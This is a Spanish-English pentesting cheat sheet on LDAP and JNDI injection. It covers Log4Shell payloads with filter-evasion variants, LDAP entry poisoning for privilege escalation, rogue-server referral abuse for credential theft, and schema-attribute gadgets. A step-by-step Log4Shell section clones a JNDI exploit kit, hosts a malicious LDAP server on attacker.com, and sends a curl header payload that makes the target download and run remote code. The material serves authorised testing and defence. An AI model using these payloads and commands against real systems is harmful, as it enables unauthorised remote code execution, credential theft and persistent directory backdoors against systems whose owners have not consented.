---
aliases:
  - JNDI Injection
  - Log4Shell
  - LDAP Entry Poisoning
  - LDAP Referral
tags:
  - type/cheatsheet
  - vuln/ldap-injection
  - vuln/jndi-injection
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[LDAP Injection]]'
  - '[[Insecure Deserialization]]'
---
# LDAP Injection - JNDI y Entry Injection

***

## JNDI Lookup Injection (Log4Shell-style)

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | Java Naming and Directory Interface (JNDI) lookup acepta LDAP URL → atacante hostea malicious LDAP server → entrega Java class → RCE en target | Log4Shell pattern. |
| CVE-2021-44228 (Log4j) | `${jndi:ldap://attacker.com/Exploit}` en logged string | Most famous. |
| Generic JNDI sink | `Context.lookup(userInput)` con LDAP URL | RCE. |
| Spring `@Value` inject | `${jndi:ldap://...}` en config | Spring property. |
| Logback variant | Similar a Log4j | Same family. |
| Java EE `InitialContext` | `new InitialContext().lookup(input)` | EE container. |
| OpenJPA / Hibernate | Reflection-based lookup | ORM gadgets. |
| Variant `ldaps://` | Same idea con TLS | Same. |
| Variant `dns://` | DNS lookup (less impact) | Probe canary. |
| Variant `rmi://` | Java RMI server gadget | Same family. |
| Variant `iiop://` | CORBA gadget | Edge. |
| Bypass filter `${jndi:` | `${${env:NaN:-j}ndi:...}`, `${jndi${::-:}ldap://...}` | Filter evasion Log4Shell. |
| Header reflection | `User-Agent: ${jndi:...}` reflected en logs | Common vector. |
| Other reflected fields | URI, body, query params | Wide surface. |
| Impact | Pre-auth RCE en stack Java | Critical. |
^ldap-jndi-lookup

### Log4Shell setup completo

```bash
# 1. Atacante hostea LDAP server malicioso (con marshalsec o JNDI-Exploit-Kit)
git clone https://github.com/welk1n/JNDI-Injection-Exploit
cd JNDI-Injection-Exploit
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i attacker.com -p 1389

# 2. Enviar payload a target (any logged input)
curl -H 'User-Agent: ${jndi:ldap://attacker.com:1389/Basic/Command/base64/<base64-cmd>}' \
     https://target/

# 3. Target Java app loga User-Agent → Log4j evalúa expresión:
#    - JNDI lookup ldap://attacker.com:1389/Basic/...
#    - Atacante's LDAP server retorna entry con javaCodeBase y javaClassName
#    - Target downloads class → executes
#    - RCE
```

___

## LDAP Entry Poisoning

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | App add/modify entries en LDAP. Atacante inyecta nuevo entry con malicious attributes | Persistent LDAP backdoor. |
| Add user con admin attributes | LDIF inject `memberOf: CN=admins,...` | Privilege escalation. |
| Override password | `userPassword: <attacker-hash>` | Password reset. |
| Set `userPassword` to known | Atacante registers + modifies own pass to admin's known | Bypass for service accounts. |
| Add SSH public key | `sshPublicKey` attribute (OpenLDAP+nss-ldap) → SSH access | OS-level access. |
| Add Kerberos principal | AD `userPrincipalName` modify | UPN-based auth abuse. |
| Modify display attributes | `cn: Admin User <admin@target>` | Phishing context. |
| Inject group membership | Atacante adds self to admin group | Lateral movement. |
| Service account creation | Create LDAP entry as service account | Persistence. |
| Inject computer object | AD computer object con SPN | Kerberoast surface. |
| Schema modification | If app permite schema admin | Disrupt directory. |
^ldap-jndi-entry

___

## LDAP Referral Abuse

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | LDAP referrals indicate query needs to be redirected to another server. Client follows referral, sending creds to atacante's server | Credential theft via referral. |
| Atacante sets up rogue LDAP server | Server returns `searchResRef` con URL `ldap://attacker.com/...` | Standard. |
| Target LDAP client follows | Client makes new bind con same creds → atacante captures | Plain creds. |
| TLS downgrade via referral | Initial LDAPS → referral to LDAP (cleartext) | Downgrade attack. |
| Forced referral via filter manipulation | Some servers respond con referral on certain queries | Server-side bug. |
| OpenLDAP `chase referrals` setting | Default chase referrals = on | Vulnerable default. |
| Active Directory referrals | Cross-domain queries return referrals automatically | AD inherent. |
| Referral chain | Multiple referrals → atacante chain controls | Multi-stage. |
| ManageDsaIT control | Bypass referral chasing en specific queries | Defense. |
| Trust path discovery | Atacante mappea trust paths via referrals | Recon. |
^ldap-jndi-referral

___

## Schema-Based Gadgets

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | LDAP schema defines attribute types con specific syntax (binary, integer, DN). Atacante exploita schema features para gadgets. | Advanced. |
| Binary attribute upload | `jpegPhoto` accepts arbitrary binary | Storage vector. |
| `description` exfil | Long descriptions can store data | Steganography. |
| `userCertificate` field | Binary certs stored | Chain con cert misuse. |
| `nsroleDN` (FreeIPA) | Role DN reference | Privesc. |
| `secretary` attribute | DN reference attr | Indirect references. |
| Custom schema attributes | Apps con custom schema → atacante injects | Per-app. |
| `manager` attribute | DN-valued | Org chart manipulation. |
| `seeAlso` attribute | DN reference | Search injection. |
| `sambaPasswordHistory` | Samba schema | Password history exfil. |
| Class hierarchy abuse | Add user to top class with all OPTIONAL attrs | Bypass class restrictions. |
^ldap-jndi-schema

***
